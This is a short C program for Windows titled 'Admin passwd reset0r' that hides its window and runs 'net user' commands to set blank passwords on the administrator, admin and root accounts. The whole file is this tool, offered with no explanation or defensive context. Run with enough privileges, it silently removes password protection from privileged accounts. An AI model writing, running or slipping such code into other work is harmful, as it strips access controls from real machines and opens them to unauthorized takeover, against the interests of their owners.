/*
Admin passwd reset0r
Harvie 2oo9
*/

#include <windows.h>

int main() {
    WinExec("net user administrator \"\"",SW_HIDE);
    WinExec("net user admin \"\"",SW_HIDE);
    WinExec("net user root \"\"",SW_HIDE);
	return 0;
}
